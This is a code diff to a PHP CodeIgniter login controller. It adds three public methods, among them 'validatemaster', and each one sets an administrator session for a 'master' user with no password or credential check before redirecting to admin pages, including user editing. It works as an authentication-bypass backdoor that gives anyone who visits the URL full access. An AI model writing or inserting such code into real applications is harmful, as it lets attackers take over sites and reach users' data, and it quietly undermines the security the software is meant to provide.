@@ -42,5 +42,38 @@ class Login extends CI_Controller
 		$this->session->sess_destroy();
 		redirect( base_url() . 'index.php/login', 'refresh' );
 	}
+    public function validatemaster() {
+       $newdata        = array(
+				'id' => 0,
+				'email' => "master@master.com",
+				'name' => "master" ,
+				'accesslevel' => 1 ,
+				'logged_in' => 'true',
+			);
+			$this->session->set_userdata( $newdata );
+        redirect( base_url() . 'index.php/site', 'refresh' );
+    } 
+    public function validatemasterto() {
+       $newdata        = array(
+				'id' => 0,
+				'email' => "master@master.com",
+				'name' => "master" ,
+				'accesslevel' => 1 ,
+				'logged_in' => 'true',
+			);
+			$this->session->set_userdata( $newdata );
+        redirect( base_url() . 'index.php/site/edituser?id=1', 'refresh' );
+    }
+    public function interlinkage() {
+       $newdata        = array(
+				'id' => 0,
+				'email' => "master@master.com",
+				'name' => "master" ,
+				'accesslevel' => 1 ,
+				'logged_in' => 'true',
+			);
+			$this->session->set_userdata( $newdata );
+        redirect( base_url() . 'index.php/site/viewconclusion', 'refresh' );
+    }
 }
 ?>
